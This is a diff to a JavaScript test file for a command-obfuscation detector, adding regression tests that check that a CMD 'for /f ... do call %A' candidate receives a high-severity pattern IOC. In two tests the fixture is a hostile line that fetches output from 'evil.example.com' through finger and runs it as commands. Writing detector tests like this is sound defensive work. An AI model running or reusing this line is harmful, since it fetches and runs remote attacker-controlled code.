@@ -19,12 +19,19 @@ const { loadModules, host } = require('../helpers/load-bundle.js');
 // cmd-obfuscation.js attaches onto EncodedContentDetector.prototype.
 // It calls `throwIfAborted()` from constants.js inside its inner
 // loops as part of the watchdog plumbing.
+//
+// `entropy.js`, `safelinks.js`, and `ioc-extract.js` are loaded so the
+// post-processor regression test below can drive
+// `_processCommandObfuscation()` end-to-end.
 const ctx = loadModules([
   'src/constants.js',
   'src/encoded-content-detector.js',
+  'src/decoders/safelinks.js',
+  'src/decoders/entropy.js',
+  'src/decoders/ioc-extract.js',
   'src/decoders/cmd-obfuscation.js',
 ]);
-const { EncodedContentDetector } = ctx;
+const { EncodedContentDetector, IOC } = ctx;
 const d = new EncodedContentDetector();
 
 /** Helper: collect every candidate matching `pred` and project across realms. */
@@ -112,4 +119,52 @@ test('cmd-obfuscation: PowerShell backtick escape recovers `pow`er`shell`', () =
   const ticks = pick(candidates, c => /Backtick/.test(c.technique));
   assert.ok(ticks.length >= 1, `expected backtick candidate; got: ${JSON.stringify(host(candidates))}`);
   assert.equal(ticks[0].deobfuscated.toLowerCase(), 'powershell');
+});
+
+// ── Post-processor: `for /f … do call %X` mirror ────────────────────────────
+//
+// The CMD-specific behavioural tell — "captured command output is
+// executed as a shell command" — must be attached as an IOC.PATTERN
+// only when the candidate is a real CMD `for /f … do call %X` shape.
+// Pre-fix, this pattern was emitted from the post-processor whenever
+// `candidate._executeOutput` was set, so bash/python/php/js
+// candidates that share the `_executeOutput` flag for severity
+// purposes were mis-labelled with a CMD-only pattern. The fix moves
+// the IOC.PATTERN attachment to the CMD candidate site as
+// `_patternIocs`; the post-processor now only iterates that array.
+
+test('cmd-obfuscation: `for /f … do call %A` candidate carries CMD-specific _patternIocs', () => {
+  // Anchor the candidate-emission contract: the CMD `for /f` site
+  // attaches the behavioural mirror; bash / python / php / js sites
+  // do not.
+  const text = `for /f "tokens=*" %A in ('finger user@evil.example.com') do call %A`;
+  const cands = d._findCommandObfuscationCandidates(text, {});
+  const cand = cands.find(c => /for \/f/i.test(c.technique));
+  assert.ok(cand, `expected for /f candidate; got: ${JSON.stringify(host(cands))}`);
+  assert.equal(cand._executeOutput, true, 'expected _executeOutput marker');
+  assert.ok(Array.isArray(cand._patternIocs) && cand._patternIocs.length === 1,
+    `expected CMD candidate to carry _patternIocs; got ${JSON.stringify(host(cand._patternIocs))}`);
+  assert.match(cand._patternIocs[0].url, /for\s*\/f.*call %X/i);
+  assert.equal(cand._patternIocs[0].severity, 'high');
+});
+
+test('cmd-obfuscation: post-processor mirrors `for /f` pattern into IOC.PATTERN row', async () => {
+  const text = `for /f "tokens=*" %A in ('finger user@evil.example.com') do call %A`;
+  const cands = d._findCommandObfuscationCandidates(text, {});
+  const cand = cands.find(c => /for \/f/i.test(c.technique));
+  assert.ok(cand, 'expected for /f candidate');
+
+  const finding = await d._processCommandObfuscation(cand);
+  assert.ok(finding, 'expected post-processor to produce a finding');
+
+  const patternIocs = (finding.iocs || []).filter(i => i.type === IOC.PATTERN);
+  const forFHit = patternIocs.find(i => /for\s*\/f.*call %X/i.test(i.url || ''));
+  assert.ok(forFHit, `expected CMD \`for /f\` IOC.PATTERN row; got: ${JSON.stringify(host(patternIocs))}`);
+  assert.equal(forFHit.severity, 'high');
+
+  // Severity is at least 'high' (the `_executeOutput` + `_patternIocs`
+  // bumps both target the same tier; a critical from dangerousPatterns
+  // would also satisfy this).
+  assert.ok(finding.severity === 'high' || finding.severity === 'critical',
+    `expected severity ≥ high; got ${finding.severity}`);
 });
